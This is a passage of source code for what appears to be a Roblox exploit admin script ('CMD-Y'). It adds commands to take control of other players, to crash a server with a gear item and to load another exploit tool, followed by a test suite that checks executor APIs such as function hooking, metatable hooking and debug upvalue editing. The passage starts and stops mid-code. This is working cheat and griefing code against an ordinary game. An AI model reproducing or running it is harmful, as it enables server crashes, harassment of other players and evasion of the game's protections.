					repeat game:GetService'RunService'.Heartbeat:Wait() until game.Workspace.CurrentCamera.CameraType == Enum.CameraType.Scriptable
					l__RunService__1:UnbindFromRenderStep("ShoulderCameraUpdate");
					l__ContextActionService__7:UnbindAction("ShoulderCameraZoom");
					l__ContextActionService__7:UnbindAction("ShoulderCameraSprint");
					local wepsys = game:GetService("ReplicatedStorage"):FindFirstChild('WeaponsSystem')
					if not wepsys then return end
					for i,v in pairs(wepsys:GetDescendants()) do
						if v:IsA("Script") then
							v.Disabled = true
						end
						v:Destroy()
					end
					local wep = lp.PlayerGui:FindFirstChild("ClientWeaponsScript")
					local gui = lp.PlayerGui:FindFirstChild("WeaponsSystemGui")
					local sc = lp.PlayerScripts:FindFirstChild("ClientWeaponsScript")
					local Camera = game:GetService("Workspace"):FindFirstChild("Camera")
					if wep then wep.Disabled = true wep:Destroy() end
					if gui then gui:Destroy() end
					if sc then
						sc.Disabled = true
						sc:Destroy()
					end
					game:GetService("UserInputService").MouseBehavior = Enum.MouseBehavior.Default
					ui.MouseIconEnabled = true
					PlayerService.LocalPlayer.CameraMaxZoomDistance = 400
					PlayerService.LocalPlayer.CameraMinZoomDistance = 0.5
					Camera.FieldOfView = 70
					game.Workspace.CurrentCamera.CameraType = Enum.CameraType.Custom
					game.Workspace.CurrentCamera.CameraSubject = lp.Character.Humanoid
					lp.Character.Humanoid.AutoRotate = true
				end
				prompt("Done!")
			end)
		end)

		addcmd("savereg", "sreg", "saves the regen position in the current server. Will reset when you join a new server.", function()
			if Admin:FindFirstChild("Regen") then
				local rg = {
					["JobId"] = game.JobId,
					["RegenPosX"] = Admin.Regen.Position.X,
					["RegenPosY"] = Admin.Regen.Position.Y,
					["RegenPosZ"] = Admin.Regen.Position.Z
				}
				local jso = game:GetService("HttpService"):JSONEncode(rg)
				writefile("Regen.json", jso)
				prompt("Saved regen pad position successfully!")
			else
				prompt("No regen pad to save!")
			end
		end)

		addcmd("loadreg", "lreg", "loads the saved regen position from 'savereg'.", function(plr)
			if Admin:FindFirstChild("Regen") and plr == nil then
				Player.Character.HumanoidRootPart.CFrame = Admin.Regen.CFrame
			elseif Admin:FindFirstChild("Regen") and plr ~= nil then
				for i,v in pairs(game.Players:GetPlayers()) do
					if string.sub(string.lower(v.Name), 1,#plr) == string.lower(plr) then
						local isBypass, st = bypassattemptcheck(v.Name)
						Player.Character.HumanoidRootPart.CFrame = Admin.Regen.CFrame
						task.wait(.25)
						if isBypass then
							act("pm " .. st .. " you are currently being teleported to the Regen pad...")
							act("tp " .. st .. " me")
							task.wait(1)
							act("respawn me," .. st)
						else
							act("pm " .. v.Name .. " You are currently being teleported to the Regen pad...")
							act("tp " .. v.Name .. " me")
							task.wait(1)
							act("respawn me," .. v.Name)
						end
					end
				end
			elseif not Admin:FindFirstChild("Regen") and plr == nil then
				local hasreg = isfile("Regen.json")
				if hasreg then
					local rg = readfile("Regen.json")
					if rg == "Run 'savereg' to save a regen position!" then
						return
					end

					local jso = game:GetService("HttpService"):JSONDecode(rg)
					if jso["JobId"] == game.JobId then
						prompt("Teleporting you to regen!")
						clientloadpos(CFrame.new(jso["RegenPosX"],jso["RegenPosY"] + 1,jso["RegenPosZ"]))
						wait(3)
						forcerespawn()
					else
						prompt("No regen position saved!")
						writefile("Regen.json", "Run 'savereg' to save a regen position!")
					end
				end
			end

		end)

		addcmd("fixspawns", "fixsp", "fixes the spawns", function()
			prompt("Please wait..")
			if movestatus == true then return end
			for _,v in pairs(game.Workspace:GetDescendants()) do
				if v:IsA("Part") then
					v.CanCollide = false
				end
			end
			if Map:FindFirstChild("Spawn1") then
				moveobject(Map:FindFirstChild("Spawn1"), 2)
				repeat fwait() until movestatus == false
				act("respawn me")
			end
			if Map:FindFirstChild("Spawn2") then
				moveobject(Map:FindFirstChild("Spawn2"), 2)
				repeat fwait() until movestatus == false
				act("respawn me")
			end
			if Map:FindFirstChild("Spawn3") then
				moveobject(Map:FindFirstChild("Spawn3"), 2)
				repeat fwait() until movestatus == false
				act("respawn me")
			end
			for _,v in pairs(game.Workspace:GetDescendants()) do
				if v:IsA("Part") then
					v.CanCollide = true
				end
			end
			workspace.Gravity = 198.2
			act("respawn me")
		end)



		addcmd("control", "ctrl", "controls a plr", function(plr)
			for _,v in pairs(PlayerService:GetPlayers()) do
				local isBypass, st = bypassattemptcheck(v.Name)
				local name,plrname = string.lower(v.Name), string.lower(plr)
				if string.sub(name, 1, string.len(plrname)) == plrname then
					if isBypass == true then
						if workspace:FindFirstChild(v.Name) and workspace:FindFirstChild(v.Name):FindFirstChild("HumanoidRootPart") then
							act("stun " .. st)
							act("invis me")
							wait()
							attach(v.Character.HumanoidRootPart)
						end
					else
						if workspace:FindFirstChild(v.Name) and workspace:FindFirstChild(v.Name):FindFirstChild("HumanoidRootPart") then
							act("stun " .. v.Name)
							act("invis me")
							wait()
							attach(v.Character.HumanoidRootPart)
						end
					end
				end
			end
		end)

		addcmd("blacklistcmd", "blcmd", "blacklists users from using the given command when perm is on", function(cmd)
			if cmd ~= nil and not table.find(cmds.blacklisted, cmd) then
				table.insert(cmds.blacklisted, cmd)
				prompt("Successfully blacklisted the " .. cmd .. " command.")
			end
		end)

		addcmd("unblacklistcmd", "unblcmd", "blacklists users from using command when perm is on", function(cmd)
			if cmd ~= nil and table.find(cmds.blacklisted, cmd) then
				table.remove(cmds.blacklisted, table.find(cmds.blacklisted,cmd))
				prompt("Successfully unblacklisted the " .. cmd .. " command.")
			end
		end)

		addcmd("crash", "vcrash", "crashes the server with vampire vanquisher", function()
			AntiDeath = true
			AntiAbuse = true
			slock()
			act("gear me 94794847")
			AntiDeath = false
			AntiAbuse = false
			LoopGrab = true
			act("blind all")
			task.wait(.3)
			act("h \n\n\n Client has initiated disconnect. \n\n\n")
			task.wait(.3)
			PlayerService.LocalPlayer.Backpack:WaitForChild("VampireVanquisher").Parent = PlayerService.LocalPlayer.Character
			task.wait(.25)
			act("size me .3")
			act("size me .3")
			act("size me .3")
			LoopGrab = false
		end)

		addcmd("infyield", "iy", "loads infinite yield admin", function()
			_G.LoadIY()
		end)

		addcmd("prefix", "pref", "sets prefix to the given prefix", function(pref)
			SettingsP.Prefix.PlaceholderText = ";"
			local p = pref
			if p == nil or p == "" or p == " " then
				prefix = SettingsP.Prefix.PlaceholderText
				prompt("Your prefix was invalid, changed the prefix back to " .. prefix)
			else
				prefix = p
				prompt("Successfully changed the prefix to " .. p)
			end

		end)

		addcmd("sillogs", "slogs", "allows you to see logs without admin", function()
			CMDY.SilentLogsBar.Visible = true
		end)

		addcmd("antisit", "nosit", "prevents you from being sitting", function()
			antisit = true
			task.spawn(function()
				while antisit do
					fwait()
					if workspace:FindFirstChild(Player.Name) and workspace:FindFirstChild(Player.Name):FindFirstChild("Humanoid") then
						Player.Character:FindFirstChildOfClass('Humanoid').Sit = false
					end
				end
			end)
			prompt("AntiSit is now enabled.")
		end)

		addcmd("unantisit", "unnosit", "disables antisit", function()
			antisit = false
			prompt("AntiSit is now disabled.")
		end)

		addcmd("removewelds", "delwelds", "unattaches any players", function()
			removewelds()
			prompt("Successfully removed all welds.")
		end)

		addcmd("antiattach", "noattach", "prevents others from attaching to parts", function()
			antiattach = true
			if showsm then
				servermsg("[ CMD-Y ] AntiAttach is now enabled.")
			else
				prompt("AntiAttach is now enabled.")
			end
			Toggle(AntiAttachT, 1)
		end)

		addcmd("unantiattach", "unnoattach", "stops antiattach", function()
			antiattach = false
			if showsm then
				servermsg("[ CMD-Y ] AntiAttach is now disabled.")
			else
				servermsg("AntiAttach is now disabled.")
			end
			Toggle(AntiAttachT, 2)
		end)

		addcmd("randomname", "rname", "names someone something random, run ;stop to stop", function(plr)
			for _,v in pairs(PlayerService:GetPlayers()) do
				local cplr = string.lower(plr)
				local isBypass, st = bypassattemptcheck(v.Name)
				if string.sub(string.lower(v.Name), 1, #cplr) == cplr then
					if isBypass then
						rname(st)
					else
						rname(v.Name)
					end
				end
			end
		end)

		addcmd("antinoclip", "nonoclip", "stops you from noclipping", function()
			antinoclip = true
			prompt("AntiNoclip is now enabled.")
		end)

		addcmd("unantinoc", "unnonoc", "stops anti noclip", function()
			antinoclip = false
			prompt("AntiNoclip is now disabled.")
		end)



		addcmd("setlight", "light", "sets lighting to given setting (night, dusk, colorname (full)) say 'fix' to fix", function(t)
			if t == "night" then
				act("fix")
				act("time -")
			elseif t == "dusk" then
				act("fix")
				act("time 17.66")
				act("ambient 255 165 0")
				act("outdoorambient 255 165 0")
				act("brightness 10")
			elseif t == "red" then
				act("fix")
				act("time -")
				act("ambient 255 0 0")
				act("outdoorambient 255 0 0")
			elseif t == "orange" then
				act("fix")
				act("time -")
				act("ambient 255 165 0")
				act("outdoorambient 255 165 0")
			elseif t == "yellow" then
				act("fix")
				act("time -")
				act("ambient 255 255 0")
				act("outdoorambient 255 255 0")
			elseif t == "green" then
				act("fix")
				act("time -")
				act("ambient 0 255 0")
				act("outdoorambient 0 255 0")
			elseif t == "blue" then
				act("fix")
				act("time 4")
				act("ambient 0 0 255")
				act("outdoorambient 0 0 255")
			elseif t == "indigo" or t == "purple" or t == "violet" then
				act("fix")
				act("time 4")
				act("ambient 100 0 200")
				act("outdoorambient 200 0 0")
			end
		end)

		addcmd("bypassban", "bypban", "blacklists bypass usernames automatically", function()
			bypassban = true
			if showsm then
				servermsg("[ CMD-Y ] Bypass Username Ban is now on.")
			else
				prompt("[ CMD-Y ] Bypass Username Ban is now on.")
			end

			for _,v in pairs(PlayerService:GetPlayers()) do
				local isBypass1, st1 = bypassattemptcheck(v.Name)
				if isBypass1 then
					bl(v.Name)
				end
			end
		end)

		addcmd("unbypassban", "unbypban", "stops auto blacklist of bypass usernames", function()
			bypassban = false
			if showsm then
				servermsg("[ CMD-Y ] Bypass Username Ban is now off.")
			else
				prompt("[ CMD-Y ] Bypass Username Ban is now off.")
			end
			for _,v in pairs(blacklist) do
				local isBypass1, st1 = bypassattemptcheck(v)
				if isBypass1 then
					unbl(v)
				end
			end
			act("refresh all")
		end)

		addcmd("novoid", "delvoid", "removes the void", function()

		end)

		addcmd("countdown", "cd", "counts down given time (seconds)", function(t)
			local cd = tonumber(t)
			if typeof(cd) == "number" and cd ~= nil then
				for i = cd,0,-1 do
					act("m " .. tostring(i) .. "..")
					wait(1.2)
				end
			end 
			act("m Start!")
		end)

		addcmd("newpad", "np", "gives you a new perm pad", function()
			PermPad = Pads[math.random(1, #Pads)]
			prompt("New pad chosen!")
		end)

		addcmd("fix", nil, "fixes the game, ur character, etc", function()
			fixgame()
			forcerespawn()
			prompt("Done")
		end)

		addcmd("disablesm", "dsm", "disables server message for blacklist,whitelist, etc", function()
			prompt("Disabled Server Message for CMD-Y Actions!")
			showsm = false
		end)

		addcmd("enablesm", "esm", "enables server message for blacklist,whitelist, etc", function()
			prompt("Enabled Server Message for CMD-Y Actions!")
			showsm = true
		end)

		addcmd("btoolsv2", nil, "Btools v2", function()
			btoolsv2()
		end)	
	end

	coroutine.wrap(ZCFUV_fake_script)()
end

function mod:UNCTest()
	local passes, fails, undefined = 0, 0, 0
	local running = 0

	local function getGlobal(path)
		local value = getfenv(0)

		while value ~= nil and path ~= "" do
			local name, nextValue = string.match(path, "^([^.]+)%.?(.*)$")
			value = value[name]
			path = nextValue
		end

		return value
	end

	local function test(name, aliases, callback)
		running += 1

		task.spawn(function()
			if not callback then
				print("⏺️ " .. name)
			elseif not getGlobal(name) then
				fails += 1
				warn("⛔ " .. name)
			else
				local success, message = pcall(callback)

				if success then
					passes += 1
					print("✅ " .. name .. (message and " • " .. message or ""))
				else
					fails += 1
					warn("⛔ " .. name .. " failed: " .. message)
				end
			end

			local undefinedAliases = {}

			for _, alias in ipairs(aliases) do
				if getGlobal(alias) == nil then
					table.insert(undefinedAliases, alias)
				end
			end

			if #undefinedAliases > 0 then
				undefined += 1
				warn("⚠️ " .. table.concat(undefinedAliases, ", "))
			end

			running -= 1
		end)
	end

	-- Header and summary

	print("\n")

	print("UNC Environment Check")
	print("✅ - Pass, ⛔ - Fail, ⏺️ - No test, ⚠️ - Missing aliases\n")

	task.defer(function()
		repeat task.wait() until running == 0

		local rate = math.round(passes / (passes + fails) * 100)
		local outOf = passes .. " out of " .. (passes + fails)

		print("\n")

		print("UNC Summary")
		print("✅ Tested with a " .. rate .. "% success rate (" .. outOf .. ")")
		print("⛔ " .. fails .. " tests failed")
		print("⚠️ " .. undefined .. " globals are missing aliases")
	end)

	-- Cache

	test("cache.invalidate", {}, function()
		local container = Instance.new("Folder")
		local part = Instance.new("Part", container)
		cache.invalidate(container:FindFirstChild("Part"))
		assert(part ~= container:FindFirstChild("Part"), "Reference `part` could not be invalidated")
	end)

	test("cache.iscached", {}, function()
		local part = Instance.new("Part")
		assert(cache.iscached(part), "Part should be cached")
		cache.invalidate(part)
		assert(not cache.iscached(part), "Part should not be cached")
	end)

	test("cache.replace", {}, function()
		local part = Instance.new("Part")
		local fire = Instance.new("Fire")
		cache.replace(part, fire)
		assert(part ~= fire, "Part was not replaced with Fire")
	end)

	test("cloneref", {}, function()
		local part = Instance.new("Part")
		local clone = cloneref(part)
		assert(part ~= clone, "Clone should not be equal to original")
		clone.Name = "Test"
		assert(part.Name == "Test", "Clone should have updated the original")
	end)

	test("compareinstances", {}, function()
		local part = Instance.new("Part")
		local clone = cloneref(part)
		assert(part ~= clone, "Clone should not be equal to original")
		assert(compareinstances(part, clone), "Clone should be equal to original when using compareinstances()")
	end)

	-- Closures

	local function shallowEqual(t1, t2)
		if t1 == t2 then
			return true
		end

		local UNIQUE_TYPES = {
			["function"] = true,
			["table"] = true,
			["userdata"] = true,
			["thread"] = true,
		}

		for k, v in pairs(t1) do
			if UNIQUE_TYPES[type(v)] then
				if type(t2[k]) ~= type(v) then
					return false
				end
			elseif t2[k] ~= v then
				return false
			end
		end

		for k, v in pairs(t2) do
			if UNIQUE_TYPES[type(v)] then
				if type(t2[k]) ~= type(v) then
					return false
				end
			elseif t1[k] ~= v then
				return false
			end
		end

		return true
	end

	test("checkcaller", {}, function()
		assert(checkcaller(), "Main scope should return true")
	end)

	test("clonefunction", {}, function()
		local function test()
			return "success"
		end
		local copy = clonefunction(test)
		assert(test() == copy(), "The clone should return the same value as the original")
		assert(test ~= copy, "The clone should not be equal to the original")
	end)

	test("getcallingscript", {})

	test("getscriptclosure", {"getscriptfunction"}, function()
		local module = game:GetService("CoreGui").RobloxGui.Modules.Common.Constants
		local constants = getrenv().require(module)
		local generated = getscriptclosure(module)()
		assert(constants ~= generated, "Generated module should not match the original")
		assert(shallowEqual(constants, generated), "Generated constant table should be shallow equal to the original")
	end)

	test("hookfunction", {"replaceclosure"}, function()
		local function test()
			return true
		end
		local ref = hookfunction(test, function()
			return false
		end)
		assert(test() == false, "Function should return false")
		assert(ref() == true, "Original function should return true")
		assert(test ~= ref, "Original function should not be same as the reference")
	end)

	test("iscclosure", {}, function()
		assert(iscclosure(print) == true, "Function 'print' should be a C closure")
		assert(iscclosure(function() end) == false, "Executor function should not be a C closure")
	end)

	test("islclosure", {}, function()
		assert(islclosure(print) == false, "Function 'print' should not be a Lua closure")
		assert(islclosure(function() end) == true, "Executor function should be a Lua closure")
	end)

	test("isexecutorclosure", {"checkclosure", "isourclosure"}, function()
		assert(isexecutorclosure(isexecutorclosure) == true, "Did not return true for an executor global")
		assert(isexecutorclosure(newcclosure(function() end)) == true, "Did not return true for an executor C closure")
		assert(isexecutorclosure(function() end) == true, "Did not return true for an executor Luau closure")
		assert(isexecutorclosure(print) == false, "Did not return false for a Roblox global")
	end)

	test("loadstring", {}, function()
		local animate = game:GetService("Players").LocalPlayer.Character.Animate
		local bytecode = getscriptbytecode(animate)
		local func = loadstring(bytecode)
		assert(type(func) ~= "function", "Luau bytecode should not be loadable!")
		assert(assert(loadstring("return ... + 1"))(1) == 2, "Failed to do simple math")
		assert(type(select(2, loadstring("f"))) == "string", "Loadstring did not return anything for a compiler error")
	end)

	test("newcclosure", {}, function()
		local function test()
			return true
		end
		local testC = newcclosure(test)
		assert(test() == testC(), "New C closure should return the same value as the original")
		assert(test ~= testC, "New C closure should not be same as the original")
		assert(iscclosure(testC), "New C closure should be a C closure")
	end)

	-- Console

	test("rconsoleclear", {"consoleclear"})

	test("rconsolecreate", {"consolecreate"})

	test("rconsoledestroy", {"consoledestroy"})

	test("rconsoleinput", {"consoleinput"})

	test("rconsoleprint", {"consoleprint"})

	test("rconsolesettitle", {"rconsolename", "consolesettitle"})

	-- Crypt

	test("crypt.base64encode", {"crypt.base64.encode", "crypt.base64_encode", "base64.encode", "base64_encode"}, function()
		assert(crypt.base64encode("test") == "dGVzdA==", "Base64 encoding failed")
	end)

	test("crypt.base64decode", {"crypt.base64.decode", "crypt.base64_decode", "base64.decode", "base64_decode"}, function()
		assert(crypt.base64decode("dGVzdA==") == "test", "Base64 decoding failed")
	end)

	test("crypt.encrypt", {}, function()
		local key = crypt.generatekey()
		local encrypted, iv = crypt.encrypt("test", key, nil, "CBC")
		assert(iv, "crypt.encrypt should return an IV")
		local decrypted = crypt.decrypt(encrypted, key, iv, "CBC")
		assert(decrypted == "test", "Failed to decrypt raw string from encrypted data")
	end)

	test("crypt.decrypt", {}, function()
		local key, iv = crypt.generatekey(), crypt.generatekey()
		local encrypted = crypt.encrypt("test", key, iv, "CBC")
		local decrypted = crypt.decrypt(encrypted, key, iv, "CBC")
		assert(decrypted == "test", "Failed to decrypt raw string from encrypted data")
	end)

	test("crypt.generatebytes", {}, function()
		local size = math.random(10, 100)
		local bytes = crypt.generatebytes(size)
		assert(#crypt.base64decode(bytes) == size, "The decoded result should be " .. size .. " bytes long (got " .. #crypt.base64decode(bytes) .. " decoded, " .. #bytes .. " raw)")
	end)

	test("crypt.generatekey", {}, function()
		local key = crypt.generatekey()
		assert(#crypt.base64decode(key) == 32, "Generated key should be 32 bytes long when decoded")
	end)

	test("crypt.hash", {}, function()
		local algorithms = {'sha1', 'sha384', 'sha512', 'md5', 'sha256', 'sha3-224', 'sha3-256', 'sha3-512'}
		for _, algorithm in ipairs(algorithms) do
			local hash = crypt.hash("test", algorithm)
			assert(hash, "crypt.hash on algorithm '" .. algorithm .. "' should return a hash")
		end
	end)

	--- Debug

	test("debug.getconstant", {}, function()
		local function test()
			print("Hello, world!")
		end
		assert(debug.getconstant(test, 1) == "print", "First constant must be print")
		assert(debug.getconstant(test, 2) == nil, "Second constant must be nil")
		assert(debug.getconstant(test, 3) == "Hello, world!", "Third constant must be 'Hello, world!'")
	end)

	test("debug.getconstants", {}, function()
		local function test()
			local num = 5000 .. 50000
			print("Hello, world!", num, warn)
		end
		local constants = debug.getconstants(test)
		assert(constants[1] == 50000, "First constant must be 50000")
		assert(constants[2] == "print", "Second constant must be print")
		assert(constants[3] == nil, "Third constant must be nil")
		assert(constants[4] == "Hello, world!", "Fourth constant must be 'Hello, world!'")
		assert(constants[5] == "warn", "Fifth constant must be warn")
	end)

	test("debug.getinfo", {}, function()
		local types = {
			source = "string",
			short_src = "string",
			func = "function",
			what = "string",
			currentline = "number",
			name = "string",
			nups = "number",
			numparams = "number",
			is_vararg = "number",
		}
		local function test(...)
			print(...)
		end
		local info = debug.getinfo(test)
		for k, v in pairs(types) do
			assert(info[k] ~= nil, "Did not return a table with a '" .. k .. "' field")
			assert(type(info[k]) == v, "Did not return a table with " .. k .. " as a " .. v .. " (got " .. type(info[k]) .. ")")
		end
	end)

	test("debug.getproto", {}, function()
		local function test()
			local function proto()
				return true
			end
		end
		local proto = debug.getproto(test, 1, true)[1]
		local realproto = debug.getproto(test, 1)
		assert(proto, "Failed to get the inner function")
		assert(proto() == true, "The inner function did not return anything")
		if not realproto() then
			return "Proto return values are disabled on this executor"
		end
	end)

	test("debug.getprotos", {}, function()
		local function test()
			local function _1()
				return true
			end
			local function _2()
				return true
			end
			local function _3()
				return true
			end
		end
		for i in ipairs(debug.getprotos(test)) do
			local proto = debug.getproto(test, i, true)[1]
			local realproto = debug.getproto(test, i)
			assert(proto(), "Failed to get inner function " .. i)
			if not realproto() then
				return "Proto return values are disabled on this executor"
			end
		end
	end)

	test("debug.getstack", {}, function()
		local _ = "a" .. "b"
		assert(debug.getstack(1, 1) == "ab", "The first item in the stack should be 'ab'")
		assert(debug.getstack(1)[1] == "ab", "The first item in the stack table should be 'ab'")
	end)

	test("debug.getupvalue", {}, function()
		local upvalue = function() end
		local function test()
			print(upvalue)
		end
		assert(debug.getupvalue(test, 1) == upvalue, "Unexpected value returned from debug.getupvalue")
	end)

	test("debug.getupvalues", {}, function()
		local upvalue = function() end
		local function test()
			print(upvalue)
		end
		local upvalues = debug.getupvalues(test)
		assert(upvalues[1] == upvalue, "Unexpected value returned from debug.getupvalues")
	end)

	test("debug.setconstant", {}, function()
		local function test()
			return "fail"
		end
		debug.setconstant(test, 1, "success")
		assert(test() == "success", "debug.setconstant did not set the first constant")
	end)

	test("debug.setstack", {}, function()
		local function test()
			return "fail", debug.setstack(1, 1, "success")
		end
		assert(test() == "success", "debug.setstack did not set the first stack item")
	end)

	test("debug.setupvalue", {}, function()
		local function upvalue()
			return "fail"
		end
		local function test()
			return upvalue()
		end
		debug.setupvalue(test, 1, function()
			return "success"
		end)
		assert(test() == "success", "debug.setupvalue did not set the first upvalue")
	end)

	-- Filesystem

	if isfolder and makefolder and delfolder then
		if isfolder(".tests") then
			delfolder(".tests")
		end
		makefolder(".tests")
	end

	test("readfile", {}, function()
		writefile(".tests/readfile.txt", "success")
		assert(readfile(".tests/readfile.txt") == "success", "Did not return the contents of the file")
	end)

	test("listfiles", {}, function()
		makefolder(".tests/listfiles")
		writefile(".tests/listfiles/test_1.txt", "success")
		writefile(".tests/listfiles/test_2.txt", "success")
		local files = listfiles(".tests/listfiles")
		assert(#files == 2, "Did not return the correct number of files")
		assert(isfile(files[1]), "Did not return a file path")
		assert(readfile(files[1]) == "success", "Did not return the correct files")
		makefolder(".tests/listfiles_2")
		makefolder(".tests/listfiles_2/test_1")
		makefolder(".tests/listfiles_2/test_2")
		local folders = listfiles(".tests/listfiles_2")
		assert(#folders == 2, "Did not return the correct number of folders")
		assert(isfolder(folders[1]), "Did not return a folder path")
	end)

	test("writefile", {}, function()
		writefile(".tests/writefile.txt", "success")
		assert(readfile(".tests/writefile.txt") == "success", "Did not write the file")
		local requiresFileExt = pcall(function()
			writefile(".tests/writefile", "success")
			assert(isfile(".tests/writefile.txt"))
		end)
		if not requiresFileExt then
			return "This executor requires a file extension in writefile"
		end
	end)

	test("makefolder", {}, function()
		makefolder(".tests/makefolder")
		assert(isfolder(".tests/makefolder"), "Did not create the folder")
	end)

	test("appendfile", {}, function()
		writefile(".tests/appendfile.txt", "su")
		appendfile(".tests/appendfile.txt", "cce")
		appendfile(".tests/appendfile.txt", "ss")
		assert(readfile(".tests/appendfile.txt") == "success", "Did not append the file")
	end)

	test("isfile", {}, function()
		writefile(".tests/isfile.txt", "success")
		assert(isfile(".tests/isfile.txt") == true, "Did not return true for a file")
		assert(isfile(".tests") == false, "Did not return false for a folder")
		assert(isfile(".tests/doesnotexist.exe") == false, "Did not return false for a nonexistent path (got " .. tostring(isfile(".tests/doesnotexist.exe")) .. ")")
	end)

	test("isfolder", {}, function()
		assert(isfolder(".tests") == true, "Did not return false for a folder")
		assert(isfolder(".tests/doesnotexist.exe") == false, "Did not return false for a nonexistent path (got " .. tostring(isfolder(".tests/doesnotexist.exe")) .. ")")
	end)

	test("delfolder", {}, function()
		makefolder(".tests/delfolder")
		delfolder(".tests/delfolder")
		assert(isfolder(".tests/delfolder") == false, "Failed to delete folder (isfolder = " .. tostring(isfolder(".tests/delfolder")) .. ")")
	end)

	test("delfile", {}, function()
		writefile(".tests/delfile.txt", "Hello, world!")
		delfile(".tests/delfile.txt")
		assert(isfile(".tests/delfile.txt") == false, "Failed to delete file (isfile = " .. tostring(isfile(".tests/delfile.txt")) .. ")")
	end)

	test("loadfile", {}, function()
		writefile(".tests/loadfile.txt", "return ... + 1")
		assert(assert(loadfile(".tests/loadfile.txt"))(1) == 2, "Failed to load a file with arguments")
		writefile(".tests/loadfile.txt", "f")
		local callback, err = loadfile(".tests/loadfile.txt")
		assert(err and not callback, "Did not return an error message for a compiler error")
	end)

	test("dofile", {})

	-- Input

	test("isrbxactive", {"isgameactive"}, function()
		assert(type(isrbxactive()) == "boolean", "Did not return a boolean value")
	end)

	test("mouse1click", {})

	test("mouse1press", {})

	test("mouse1release", {})

	test("mouse2click", {})

	test("mouse2press", {})

	test("mouse2release", {})

	test("mousemoveabs", {})

	test("mousemoverel", {})

	test("mousescroll", {})

	-- Instances

	test("fireclickdetector", {}, function()
		local detector = Instance.new("ClickDetector")
		fireclickdetector(detector, 50, "MouseHoverEnter")
	end)

	test("getcallbackvalue", {}, function()
		local bindable = Instance.new("BindableFunction")
		local function test()
		end
		bindable.OnInvoke = test
		assert(getcallbackvalue(bindable, "OnInvoke") == test, "Did not return the correct value")
	end)

	test("getconnections", {}, function()
		local types = {
			Enabled = "boolean",
			ForeignState = "boolean",
			LuaConnection = "boolean",
			Function = "function",
			Thread = "thread",
			Fire = "function",
			Defer = "function",
			Disconnect = "function",
			Disable = "function",
			Enable = "function",
		}
		local bindable = Instance.new("BindableEvent")
		bindable.Event:Connect(function() end)
		local connection = getconnections(bindable.Event)[1]
		for k, v in pairs(types) do
			assert(connection[k] ~= nil, "Did not return a table with a '" .. k .. "' field")
			assert(type(connection[k]) == v, "Did not return a table with " .. k .. " as a " .. v .. " (got " .. type(connection[k]) .. ")")
		end
	end)

	test("getcustomasset", {}, function()
		writefile(".tests/getcustomasset.txt", "success")
		local contentId = getcustomasset(".tests/getcustomasset.txt")
		assert(type(contentId) == "string", "Did not return a string")
		assert(#contentId > 0, "Returned an empty string")
		assert(string.match(contentId, "rbxasset://") == "rbxasset://", "Did not return an rbxasset url")
	end)

	test("gethiddenproperty", {}, function()
		local fire = Instance.new("Fire")
		local property, isHidden = gethiddenproperty(fire, "size_xml")
		assert(property == 5, "Did not return the correct value")
		assert(isHidden == true, "Did not return whether the property was hidden")
	end)

	test("sethiddenproperty", {}, function()
		local fire = Instance.new("Fire")
		local hidden = sethiddenproperty(fire, "size_xml", 10)
		assert(hidden, "Did not return true for the hidden property")
		assert(gethiddenproperty(fire, "size_xml") == 10, "Did not set the hidden property")
	end)

	test("gethui", {}, function()
		assert(typeof(gethui()) == "Instance", "Did not return an Instance")
	end)

	test("getinstances", {}, function()
		assert(getinstances()[1]:IsA("Instance"), "The first value is not an Instance")
	end)

	test("getnilinstances", {}, function()
		assert(getnilinstances()[1]:IsA("Instance"), "The first value is not an Instance")
		assert(getnilinstances()[1].Parent == nil, "The first value is not parented to nil")
	end)

	test("isscriptable", {}, function()
		local fire = Instance.new("Fire")
		assert(isscriptable(fire, "size_xml") == false, "Did not return false for a non-scriptable property (size_xml)")
		assert(isscriptable(fire, "Size") == true, "Did not return true for a scriptable property (Size)")
	end)

	test("setscriptable", {}, function()
		local fire = Instance.new("Fire")
		local wasScriptable = setscriptable(fire, "size_xml", true)
		assert(wasScriptable == false, "Did not return false for a non-scriptable property (size_xml)")
		assert(isscriptable(fire, "size_xml") == true, "Did not set the scriptable property")
		fire = Instance.new("Fire")
		assert(isscriptable(fire, "size_xml") == false, "⚠️⚠️ setscriptable persists between unique instances ⚠️⚠️")
	end)

	test("setrbxclipboard", {})

	-- Metatable

	test("getrawmetatable", {}, function()
		local metatable = { __metatable = "Locked!" }
		local object = setmetatable({}, metatable)
		assert(getrawmetatable(object) == metatable, "Did not return the metatable")
	end)

	test("hookmetamethod", {}, function()
		local object = setmetatable({}, { __index = newcclosure(function() return false end), __metatable = "Locked!" })
		local ref = hookmetamethod(object, "__index", function() return true end)
		assert(object.test == true, "Failed to hook a metamethod and change the return value")
		assert(ref() == false, "Did not return the original function")
	end)

	test("getnamecallmethod", {}, function()
		local method
		local ref
		ref = hookmetamethod(game, "__namecall", function(...)
			if not method then
				method = getnamecallmethod()
			end
			return ref(...)
		end)
		game:GetService("Lighting")
		assert(method == "GetService", "Did not get the correct method (GetService)")
	end)

	test("isreadonly", {}, function()
		local object = {}
		table.freeze(object)
		assert(isreadonly(object), "Did not return true for a read-only table")
	end)

	test("setrawmetatable", {}, function()
		local object = setmetatable({}, { __index = function() return false end, __metatable = "Locked!" })
		local objectReturned = setrawmetatable(object, { __index = function() return true end })
		assert(object, "Did not return the original object")
		assert(object.test == true, "Failed to change the metatable")
		if objectReturned then
			return objectReturned == object and "Returned the original object" or "Did not return the original object"
		end
	end)

	test("setreadonly", {}, function()
		local object = { success = false }
		table.freeze(object)
		setreadonly(object, false)
		object.success = true
		assert(object.success, "Did not allow the table to be modified")
	end)

	-- Miscellaneous

	test("identifyexecutor", {"getexecutorname"}, function()
		local name, version = identifyexecutor()
		assert(type(name) == "string", "Did not return a string for the name")
		return type(version) == "string" and "Returns version as a string" or "Does not return version"
	end)

	test("lz4compress", {}, function()
		local raw = "Hello, world!"
		local compressed = lz4compress(raw)
		assert(type(compressed) == "string", "Compression did not return a string")
		assert(lz4decompress(compressed, #raw) == raw, "Decompression did not return the original string")
	end)

	test("lz4decompress", {}, function()
		local raw = "Hello, world!"
		local compressed = lz4compress(raw)
		assert(type(compressed) == "string", "Compression did not return a string")
		assert(lz4decompress(compressed, #raw) == raw, "Decompression did not return the original string")
	end)

	test("messagebox", {})

	test("queue_on_teleport", {"queueonteleport"})

	test("request", {"http.request", "http_request"}, function()
		local response = request({
			Url = "https://httpbin.org/user-agent",
			Method = "GET",
		})
		assert(type(response) == "table", "Response must be a table")
		assert(response.StatusCode == 200, "Did not return a 200 status code")
		local data = game:GetService("HttpService"):JSONDecode(response.Body)
